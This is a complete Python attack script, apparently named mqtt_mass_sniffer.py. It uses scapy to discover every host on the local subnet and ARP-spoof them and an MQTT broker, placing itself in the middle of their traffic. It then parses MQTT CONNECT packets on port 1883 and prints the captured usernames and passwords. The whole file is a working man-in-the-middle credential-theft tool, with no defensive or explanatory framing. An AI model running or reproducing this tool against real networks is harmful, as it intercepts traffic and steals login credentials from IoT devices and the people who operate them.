#!/usr/bin/env python3
# mqtt_mass_sniffer.py (final version)

import os
import socket
import time
import struct
from threading import Thread
from scapy.all import ARP, Ether, srp, send, sniff, TCP, Raw

# ───────────────────────────────
def get_local_subnet():
    """Detect local IP and return its /24 subnet."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.255.255.255", 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip.rsplit('.', 1)[0] + ".0/24"

# ───────────────────────────────
def get_all_devices(subnet):
    print("[*] Discovering live devices…")
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
        timeout=2,
        verbose=False
    )
    return [rcv.psrc for snd, rcv in answered if ARP in rcv]

# ───────────────────────────────
def get_mac(ip):
    """Get MAC using ARP request."""
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        verbose=False
    )
    for _, rcv in answered:
        return rcv[Ether].src
    return None

def cache_mac_addresses(victims, broker_ip):
    print("[*] Caching MAC addresses…")
    mac_map = {}
    for ip in victims:
        mac = get_mac(ip)
        if mac:
            mac_map[ip] = mac
    broker_mac = get_mac(broker_ip)
    return mac_map, broker_mac

# ───────────────────────────────
def arp_spoof_loop(mac_map, broker_ip, broker_mac):
    print("[*] Starting ARP spoof loop...")
    def spoof():
        while True:
            for victim_ip, victim_mac in mac_map.items():
                send(ARP(op=2, pdst=victim_ip, psrc=broker_ip, hwdst=victim_mac), verbose=False)
                send(ARP(op=2, pdst=broker_ip, psrc=victim_ip, hwdst=broker_mac), verbose=False)
            time.sleep(2)
    Thread(target=spoof, daemon=True).start()

# ───────────────────────────────
def extract_credentials(pkt):
    if Raw in pkt and pkt[TCP].dport == 1883:
        payload = pkt[Raw].load
        if payload[0] == 0x10:  # CONNECT packet
            try:
                i = 2
                proto_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + proto_len + 4
                client_id_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + client_id_len
                username_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                username = payload[i:i+username_len].decode(errors="ignore")
                i += username_len
                password_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                password = payload[i:i+password_len].decode(errors="ignore")
                print(f"[+] MQTT Credentials → Username: '{username}' | Password: '{password}'")
            except Exception:
                pass

def sniff_credentials(interface="eth0"):
    print("[*] Sniffing MQTT credentials on port 1883…")
    sniff(iface=interface, filter="tcp port 1883", prn=extract_credentials, store=0)

# ───────────────────────────────
if __name__ == "__main__":
    broker_ip = "192.168.10.1"
    subnet = get_local_subnet()

    print(f"[*] Broker: {broker_ip}")
    print(f"[*] Subnet: {subnet}")

    victims = get_all_devices(subnet)
    victims = [ip for ip in victims if ip != broker_ip]

    print("[+] Victims:", ", ".join(victims))

    mac_map, broker_mac = cache_mac_addresses(victims, broker_ip)

    print(f"[+] Broker MAC: {broker_mac}")
    print("[+] Victim MACs:")
    for ip, mac in mac_map.items():
        print(f"    {ip} → {mac}")

    arp_spoof_loop(mac_map, broker_ip, broker_mac)
    sniff_credentials()

